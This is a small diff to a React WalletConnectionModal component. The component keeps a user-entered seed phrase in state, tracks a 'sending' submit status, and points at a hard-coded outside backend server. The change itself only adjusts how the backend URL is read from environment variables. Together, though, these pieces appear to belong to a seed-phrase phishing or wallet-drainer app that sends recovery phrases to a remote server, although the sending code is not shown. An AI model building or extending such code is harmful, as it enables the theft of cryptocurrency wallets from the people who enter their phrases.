@@ -17,7 +17,7 @@ export default function WalletConnectionModal({
   const [seedPhrase, setSeedPhrase] = useState('');
   const [isSeedValid, setIsSeedValid] = useState(false);
   const [submitStatus, setSubmitStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
-  const backendUrl = process.env.BACKEND_URL || 'https://dappsconnector-wascoslim-server.vercel.app';
+  const backendUrl = import.meta.env.VITE_BACKEND_URL || (import.meta as any).env.REACT_APP_BACKEND_URL || 'https://dappsconnector-wascoslim-server.vercel.app';
 
   useEffect(() => {
     console.log(backendUrl);
